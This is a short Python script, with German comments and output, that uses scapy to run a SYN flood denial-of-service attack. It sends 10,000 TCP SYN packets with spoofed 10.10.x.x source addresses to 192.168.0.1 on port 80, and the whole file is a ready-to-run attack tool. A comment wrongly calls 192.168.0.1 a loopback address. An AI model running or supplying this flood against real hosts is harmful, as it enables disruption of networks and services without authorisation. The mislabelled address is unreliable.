from scapy.all import IP, TCP, send
import time


def syn_flood(target_ip, target_port, packet_count, interval, interface):
    print(f"Starte SYN-Flood-Angriff auf {target_ip}:{target_port} mit {packet_count} Paketen über Interface {interface}...")
    for i in range(packet_count):
        source_ip = f"10.10.{i % 256}.{i % 256}"
        pkt = IP(src=source_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
        send(pkt, inter=interval, iface=interface, verbose=0)
        if i % 1000 == 0:
            print(f"{i} Pakete gesendet...")
    print("SYN-Flood-Angriff abgeschlossen.")


if __name__ == "__main__":
    target_ip = "192.168.0.1"  # Loopback-Adresse
    target_port = 80  # Ziel-Port
    packet_count = 10000  # Anzahl der zu sendenden Pakete
    interval = 0.00001  # Intervall zwischen Paketen
    interface = "WLAN"

    # SYN-Flood starten
    syn_flood(target_ip, target_port, packet_count, interval, interface)
